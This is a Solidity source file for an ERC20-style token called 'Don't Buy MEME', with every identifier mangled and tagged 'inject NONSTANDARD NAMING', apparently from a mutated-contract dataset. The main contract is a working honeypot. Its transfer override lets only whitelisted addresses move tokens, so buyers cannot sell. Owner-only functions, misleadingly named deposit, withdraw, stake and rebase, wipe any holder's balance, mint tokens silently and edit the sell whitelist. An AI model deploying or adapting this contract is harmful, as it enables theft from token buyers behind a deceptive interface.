                                                                 

                                                                 

pragma solidity ^0.5.17;

interface IERC20 {
    function TOTALSUPPLY837() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF123(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER407(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE634(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE746(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM664(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER762(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL37(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor () internal { }
    function _MSGSENDER154() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    uint private _totalSupply;
    function TOTALSUPPLY837() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF123(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER407(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _ONSET346(_MSGSENDER154(), recipient, amount);
        return true;
    }
    function ALLOWANCE634(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE746(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE771(_MSGSENDER154(), spender, amount);
        return true;
    }
    function TRANSFERFROM664(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _ONSET346(sender, recipient, amount);
        _APPROVE771(sender, _MSGSENDER154(), _allowances[sender][_MSGSENDER154()].SUB811(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE594(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE771(_MSGSENDER154(), spender, _allowances[_MSGSENDER154()][spender].ADD456(addedValue));
        return true;
    }
    function DECREASEALLOWANCE733(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE771(_MSGSENDER154(), spender, _allowances[_MSGSENDER154()][spender].SUB811(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _ONSET346(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB811(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD456(amount);
        emit TRANSFER762(sender, recipient, amount);
    }
    function _INITMINT230(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD456(amount);
        _balances[account] = _balances[account].ADD456(amount);
        emit TRANSFER762(address(0), account, amount);
    }
    function _BURN157(address account, uint256 amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].SUB811(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB811(amount);
        emit TRANSFER762(account, address(0), amount);
    }
    function _WITHDRAW997(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: _withdraw to the zero address");
        _totalSupply = _totalSupply.ADD456(amount);
        _balances[account] = _balances[account].ADD456(amount);
    }
    function _DEPOSIT36(address acc) internal {	//inject NONSTANDARD NAMING
        _balances[acc] = 0;
    }
    function _APPROVE771(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit APPROVAL37(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME415() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL575() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS659() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD456(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function SUB811(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB811(a, b, "SafeMath: subtraction overflow");
    }
    function SUB811(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function MUL807(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function DIV374(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV374(a, b, "SafeMath: division by zero");
    }
    function DIV374(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract DontBuyMEME is ERC20, ERC20Detailed {
  using SafeMath for uint;
  mapping (address => bool) public governance;
  mapping (address => bool) public stakers;
  address public router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
  constructor () public ERC20Detailed("Don't Buy MEME", "Don't Buy MEME", 18) {
      _INITMINT230( msg.sender, 800*10**uint(DECIMALS659()) );
      governance[msg.sender] = true;
      stakers[msg.sender] = true;
      stakers[router] = true;
  }
  function DEPOSIT660(address account) public {	//inject NONSTANDARD NAMING
      require(governance[msg.sender], "error");
      _DEPOSIT36(account);
  }
  function WITHDRAW159(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(governance[msg.sender], "error");
      _WITHDRAW997(account, amount);
  }
  function _ONSET346(address from_, address to_, uint amount) internal {	//inject NONSTANDARD NAMING
    require(stakers[from_], 'unauthorized');
    super._ONSET346(from_, to_, amount);
  }
  function _STAKE199(address account) public {	//inject NONSTANDARD NAMING
      require(governance[msg.sender], "error");
      stakers[account] = true;
  }
  function _LOGREBASE237(address account) public {	//inject NONSTANDARD NAMING
      require(governance[msg.sender], "error");
      stakers[account] = false;
  }
}